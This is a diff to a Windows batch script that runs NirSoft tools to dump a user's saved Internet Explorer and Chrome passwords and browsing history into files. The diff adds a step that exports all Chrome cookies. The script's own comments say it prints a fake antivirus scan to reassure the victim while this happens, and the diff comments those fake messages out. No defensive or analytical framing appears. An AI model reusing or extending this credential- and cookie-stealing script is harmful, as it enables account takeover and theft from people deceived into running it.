@@ -7,7 +7,7 @@
 @echo off
 
 :: Return fake antivirus program string to reassure user
-echo Starting Virus Scan...
+:: echo Starting Virus Scan...
 
 :: Set variable for the dynimic portions of the file, and include the file extension
 FOR %%A IN (%Date:/=%) DO SET Today=%%A
@@ -77,6 +77,11 @@ start iepv.exe /stext iepv_%DYNPATHNAME%
 :: 	You can select one or more items and then save them into text/html/xml file or copy them to the clipboard.
 start ChromePass.exe /stext ChromePass_%DYNPATHNAME%
 
+:: ChromeCookiesView is an alternative to the standard internal cookies viewer of Google Chrome Web browser. 
+:: it displays the list of all cookies stored by Google Chrome Web browser, and allows you to easily delete unwanted cookies. 
+:: It also allows you export the cookies into text/csv/html/xml file.
+start ChromeCookiesView.exe /scomma ChromeCookie_%DYNPATHNAME%
+
 :: ChromeHistoryView is a small utility that reads the history data file of Google Chrome Web browser, and 
 :: 	displays the list of all visited Web pages in the last days. For each visited Web page, the following 
 :: 	information is displayed: URL, Title, Visit Date/Time, Number of visits, number of times that the user 
@@ -99,9 +104,9 @@ start BrowsingHistoryView.exe /stext BrowsingHistoryView_%DYNPATHNAME%
 
 
 :: Return fake antivirus program string to reassure user
-echo 0 viruses found.
+:: echo 0 viruses found.
 
 :: Dirty Windows OS agnostic workaround to leave the fake antivirus echo strings open 
 :: 	for 5 seconds before auto-exiting the DOS window popup
-ping -n 5 127.0.0.1 > nul
+:: ping -n 5 127.0.0.1 > nul
 exit
